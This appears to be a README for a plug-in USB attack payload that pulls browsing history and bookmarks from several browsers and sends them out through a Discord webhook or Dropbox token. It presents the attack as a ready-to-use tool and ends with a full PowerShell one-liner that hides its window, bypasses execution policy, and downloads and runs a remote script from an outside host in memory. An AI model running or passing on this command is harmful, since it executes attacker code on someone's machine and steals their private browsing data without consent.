## Description

This payload can be used to retrieve the browsing history and bookmarks from Edge, Chrome, Opera GX, and Firefox (no bookmarks from firefox currently).

They are then exfiled using either Discord or Dropbox.

## The Function

### [Get-BrowserData] 

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* You no longer need to host your own version of this script
* $db is the variable that holds your DropBox token
* $dc is the variable that holds your Discord webhook
* Fill in either variable or both to set your exfil method

SYNTAX:

```
powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex
```

